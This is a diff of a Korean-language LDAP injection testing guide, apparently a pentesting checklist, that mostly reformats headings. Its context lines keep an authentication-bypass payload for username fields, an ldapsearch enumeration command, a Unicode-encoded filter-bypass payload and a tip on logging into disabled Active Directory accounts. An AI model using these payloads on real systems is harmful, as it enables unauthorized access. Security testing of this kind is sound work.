@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **인증 우회** (`AUTH_BYPASS` 라벨):
 - `admin)(|(uid=*` (username)
@@ -66,7 +64,7 @@ ldapsearch -h target -x -b "dc=target,dc=com" "(objectClass=*)"
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -87,7 +85,7 @@ admin\u0029\u0028\u007C       (Unicode)
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - 로그인 폼이 가장 흔한 sink — username/password 양쪽 시도
 - AD 환경에선 `userAccountControl` bit 검사 우회로 비활성 계정 로그인 가능
